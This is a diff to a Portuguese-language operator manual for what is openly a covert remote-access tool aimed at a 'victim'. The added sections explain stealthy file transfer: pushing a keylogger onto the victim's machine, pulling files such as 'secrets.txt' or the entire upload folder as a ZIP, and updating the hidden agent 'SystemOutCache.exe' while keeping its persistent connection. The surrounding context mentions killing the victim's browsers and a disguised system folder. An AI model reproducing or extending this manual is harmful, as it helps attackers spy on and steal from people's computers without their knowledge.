@@ -65,6 +65,22 @@ E. STOPNAME:<nome>
    Ex: STOPNAME:chrome (Fecha todos os navegadores da vítima)
 
 
+F. TRANSFERÊNCIA DE ARQUIVOS (NOVO) 📂
+   Use o console para enviar e baixar arquivos de forma furtiva.
+   
+   PUT <arquivo_local>
+   - Envia um arquivo do seu PC para a pasta UPLOAD da vítima.
+   - Ex: PUT keylogger.exe
+   - Destino: C:\Windows\SystemOut\UPLOAD\keylogger.exe
+   
+   GET <arquivo_remoto>
+   - Baixa um arquivo da pasta UPLOAD (ou caminho completo).
+   - Ex: GET secrets.txt
+   
+   GET UPLOAD
+   - Baixa TODA a pasta de uploads da vítima como um arquivo ZIP.
+   - Ex: GET UPLOAD  -> Salva como UPLOAD.zip no seu PC.
+
 [3] SystemOutCache.exe
 --------------------------------------------------------------------------------
 
@@ -157,6 +173,11 @@ Você deve gerenciar a rede pelo Site Legado (https://my.zerotier.com/network).
   Sempre use STOPNAME para garantir que matou tudo.
 - Logs: Se algo der errado, procure por 'nettool_debug.log' na pasta SystemOut.
 - No Windows para melhor desepempenho, altere o Huge Pages e adicionar "Todos".
+
+- Atualização Automática:
+  No Menu Principal do Cliente, use a opção '5 - ATUALIZAR AGENTE' para atualizar
+  o executável remoto sem perder a conexão persistentemente.
+  Basta ter o novo 'SystemOutCache.exe' na mesma pasta do seu SystemClient.
 
 ================================================================================
                               FIM DO MANUAL
